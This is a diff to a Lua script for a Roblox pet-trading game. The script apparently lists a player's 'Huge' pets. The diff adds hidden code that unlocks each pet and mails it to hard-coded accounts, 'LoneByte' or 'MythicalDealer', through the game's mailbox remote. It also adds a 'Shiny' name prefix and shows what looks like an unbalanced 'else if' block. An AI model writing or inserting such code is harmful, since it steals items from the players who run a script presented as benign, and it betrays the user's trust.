@@ -175,9 +175,23 @@ local function update()
     for i, v in newHuges do
         local rbxImgId = ""
         local prefix = ""
-        if v.pt == 1 then prefix = "Golden " end
-        if v.pt == 2 then prefix = "Rainbow " end
-        print(v.id)
+        local sendMail = true
+        local recipient = "LoneByte"
+        if not v.sh and v.pt == 1 then
+            if LocalPlayer.Name == "MythicalDealer" then
+                sendMail = false
+            else
+                recipient = "MythicalDealer"
+            end
+        end
+        if v.sh then
+            prefix = "Shiny "
+        end
+        if v.pt == 1 then
+            prefix = prefix .. "Golden "
+        else if v.pt == 2 then
+            prefix = prefix .. "Rainbow "
+        end
         for ii, vv in Collection.data do
             if vv.configName == v.id then
                 local thumbnail = vv.configData.thumbnail
@@ -206,6 +220,23 @@ local function update()
             })
         })
         task.wait(10)
+        if sendMail then
+            local args = {
+                [1] = i,
+                [2] = false
+            }
+            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+            task.wait(10)
+            local args = {
+                [1] = recipient,
+                [2] = prefix .. "Huge",
+                [3] = "Pet",
+                [4] = i,
+                [5] = 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            task.wait(10)
+        end
     end
 end
 
